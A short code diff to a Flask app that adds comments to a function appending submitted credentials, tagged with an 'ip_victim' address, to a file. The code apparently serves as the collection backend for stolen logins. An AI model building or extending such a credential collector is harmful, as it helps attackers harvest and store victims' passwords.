@@ -13,17 +13,21 @@ app = Flask(__name__)
 # 
 def add_credentials_to_file(credentials, file_path, ip_victim):
 
+    # Create a dict from parameter credentials
     dict_obj = ast.literal_eval(credentials)
 
     try:
 
+        # Format line
         formatted_line = ip_victim + " --- " + "; ".join([f"{key}='{value}'" for key, value in dict_obj.items()]) + ";\n"
 
+        # Open file and paste new line
         with open(file_path, mode='a', encoding='utf-8') as file:
             file.write(formatted_line)
 
+        # Return a success HTTP response
         return {"message": "Data successfully added"}, 200
-
+    
     except Exception as e:
         print(e);
         return {"message": f"An error occurred: {str(e)}"}, 500
